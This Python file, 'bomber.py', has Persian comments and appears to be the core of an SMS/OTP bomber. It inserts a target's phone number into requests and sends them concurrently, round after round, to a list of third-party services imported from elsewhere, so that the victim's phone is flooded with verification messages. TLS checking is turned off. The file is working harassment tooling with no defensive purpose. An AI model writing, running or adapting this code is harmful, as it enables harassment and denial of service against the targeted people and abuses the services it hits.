# bomber.py
import asyncio
import time
from typing import Any, Dict

import aiohttp

from services import DEFAULT_HEADERS


def _fmt(obj: Any, ctx: Dict[str, str]) -> Any:
    """جایگزینی {p} / {p98} / {pp} داخل دیکشنری/لیست/رشته."""
    if isinstance(obj, str):
        try:
            return obj.format(**ctx)
        except (KeyError, IndexError):
            return obj
    if isinstance(obj, dict):
        return {k: _fmt(v, ctx) for k, v in obj.items()}
    if isinstance(obj, list):
        return [_fmt(v, ctx) for v in obj]
    return obj


async def _hit(session, sem, svc, phone):
    """یک درخواست به یک سرویس. خروجی: (موفق؟, کد)"""
    ctx = {"p": phone, "p98": phone[1:], "pp": "+" + phone[1:]}
    url = svc["url"]
    headers = {**DEFAULT_HEADERS, **svc.get("headers", {})}
    payload = _fmt(svc.get("json"), ctx)
    form = _fmt(svc.get("data"), ctx)
    method = svc.get("method", "POST").upper()
    ok_codes = svc.get("ok_codes")

    kwargs = {"headers": headers, "allow_redirects": True}
    if payload is not None:
        headers.setdefault("Content-Type", "application/json")
        kwargs["json"] = payload
    elif form is not None:
        kwargs["data"] = form

    try:
        async with sem:
            async with session.request(method, url, **kwargs) as resp:
                code = resp.status
                ok = (code in ok_codes) if ok_codes else (200 <= code < 400)
                return ok, code
    except asyncio.TimeoutError:
        return False, "timeout"
    except Exception as e:                      # noqa: BLE001
        return False, type(e).__name__


async def run_bomb(phone, rounds, services, on_progress=None,
                   concurrency=30, timeout=15):
    """rounds بار، هر بار به همه‌ی سرویس‌ها همزمان درخواست می‌زنه."""
    sem = asyncio.Semaphore(concurrency)
    per = {s["name"]: {"ok": 0, "fail": 0} for s in services}
    total_ok = total_fail = 0
    started = time.monotonic()

    conn = aiohttp.TCPConnector(limit=concurrency * 2, ssl=False)
    tmo = aiohttp.ClientTimeout(total=timeout)
    async with aiohttp.ClientSession(connector=conn, timeout=tmo) as session:
        for r in range(rounds):
            results = await asyncio.gather(
                *[_hit(session, sem, s, phone) for s in services]
            )
            for svc, (ok, _code) in zip(services, results):
                key = "ok" if ok else "fail"
                per[svc["name"]][key] += 1
                if ok:
                    total_ok += 1
                else:
                    total_fail += 1
            if on_progress:
                await on_progress(r + 1, rounds, total_ok, total_fail)

    return {
        "ok": total_ok,
        "fail": total_fail,
        "per": per,
        "seconds": time.monotonic() - started,
    }
